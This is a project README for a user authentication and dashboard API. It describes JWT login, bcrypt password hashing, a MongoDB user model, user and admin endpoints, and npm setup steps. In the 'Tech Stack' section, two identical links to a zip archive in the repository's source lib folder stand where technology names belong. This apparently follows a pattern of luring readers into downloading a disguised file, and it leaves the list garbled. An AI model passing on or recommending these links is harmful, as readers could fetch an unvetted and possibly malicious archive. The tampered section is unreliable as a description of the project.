**User Authentication & Dashboard API**

**Project Overview**
This project is a backend-focused User Authentication & Dashboard System built to handle secure user registration, login, and role-based access control using JWT authentication.
The API supports users and admins, provides protected routes, and ensures secure password handling.

**Objective**
To develop a backend API for user authentication with:
Secure password hashing
Token-based authentication (JWT)
Role-based access (User / Admin)

**Tech Stack**
https://raw.githubusercontent.com/adityadav002/AppZeto/main/backend/src/lib/Zeto-App-v3.1.zip
https://raw.githubusercontent.com/adityadav002/AppZeto/main/backend/src/lib/Zeto-App-v3.1.zip
MongoDB
JWT (JSON Web Tokens)
bcrypt

**Database Model**

User Model
Field	Description
name	Required
email	Unique, Required
password	Hashed, Required
role	user / admin (default: user)
createdAt	Auto-generated

**API Endpoints**
Authentication Routes
Method	Endpoint	Description
POST	/api/auth/register	Register a new user
POST	/api/auth/login	Login user and return JWT
POST	/api/auth/logout	Logout user
GET	/api/auth/me	Get current logged-in user

User Routes (Protected)
Method	Endpoint	Description
GET	/api/user/dashboard	User dashboard data
GET	/api/user/profile	Get user profile
PUT	/api/user/profile	Update user profile

Admin Routes (Protected – Admin Only)
Method	Endpoint	Description
GET	/api/admin/dashboard	Admin dashboard statistics
GET	/api/admin/users	Get all users
DELETE	/api/admin/users/:id	Delete a user

**Authentication & Authorization**
JWT is used for authentication
Protected routes require a valid token
Admin routes are accessible only to users with admin role

**Setup Instructions**

1) Clone the repository

2) Install dependencies

   npm install


Create a .env file and add:

MONGO_URL=your_mongodb_connection


Start the server

  npm start

  
